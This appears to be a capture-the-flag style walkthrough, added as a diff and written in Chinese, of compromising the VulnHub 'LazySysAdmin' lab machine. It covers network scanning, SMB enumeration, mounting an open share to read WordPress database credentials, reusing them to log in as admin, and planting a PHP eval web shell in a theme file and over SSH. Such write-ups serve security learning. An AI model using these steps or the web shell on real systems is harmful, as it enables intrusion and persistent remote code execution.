@@ -1,0 +1,72 @@
+
+https://download.vulnhub.com/lazysysadmin/Lazysysadmin.zip
+
+
+	扫描主机（netdiscover）
+sudo netdiscover -i eth0 -r 192.168.100.0/24
+
+目标主机IP：192.168.100.148
+	
+	扫描端口（masscan）
+sudo masscan --rate=10000 --ports 0-65535 192.168.100.148
+	Discovered open port 22/tcp on 192.168.100.148  
+	Discovered open port 139/tcp on 192.168.100.148      
+	Discovered open port 3306/tcp on 192.168.100.148      
+	Discovered open port 445/tcp on 192.168.100.148                                
+	Discovered open port 80/tcp on 192.168.100.148                                 
+	Discovered open port 6667/tcp on 192.168.100.148          
+
+	扫描端口的详细信息（nmap）
+sudo nmap -sV -T4 -p 22,80,139,445,3306,6667 192.168.100.148         
+	22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+	80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
+	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	3306/tcp open  mysql       MySQL (unauthorized)
+	6667/tcp open  irc         InspIRCd
+	MAC Address: 00:0C:29:4F:6D:EF (VMware)
+	Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+139,445端口（共享服务）
+
+	枚举靶机信息
+sudo enum4linux 192.168.100.148
+	[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+	远程网络挂载
+sudo mount -t cifs -o username='',password='' //192.168.100.148/share$  /down
+
+cat /down/wordpress/wp-config.php
+	define('DB_NAME', 'wordpress');
+	define('DB_USER', 'Admin');
+	define('DB_PASSWORD', 'TogieMYSQL12345^^');
+
+80端口（Apache服务——http）
+	
+	网站指纹信息扫描（whatweb）
+whatweb 192.168.100.148
+	http://192.168.100.148 [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.168.100.148], JQuery, MetaGenerator[Silex v2.2.7], PoweredBy[-,Silex], Script[text/javascript], Title[Backnode]
+
+	目录扫描（dirb）
+dirb http://192.168.100.148
+	http://192.168.100.148/info.php
+	http://192.168.100.148/robots.txt
+	http://192.168.100.148/wordpress/
+	http://192.168.100.148/wordpress/wp-admin/
+		用户名：Admin，密码：TogieMYSQL12345^^；成功登录；
+	
+	制作后门（在404页面中注入一句话木马）
+http://192.168.100.148/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen
+	<?php @eval($_POST[xiuxiu]);?>
+	
+	http://192.168.100.148/wordpress/?p=13333333
+	
+	查看phpmyadmin后台登录页面
+	http://192.168.100.148/phpmyadmin
+	
+22端口（SSH服务）
+	ssh togie@192.168.100.148    
+  
+	cd /var/www/html
+	vim 1.php 
+	<?php @eval($_POST[xiuxiu]);?>
+	
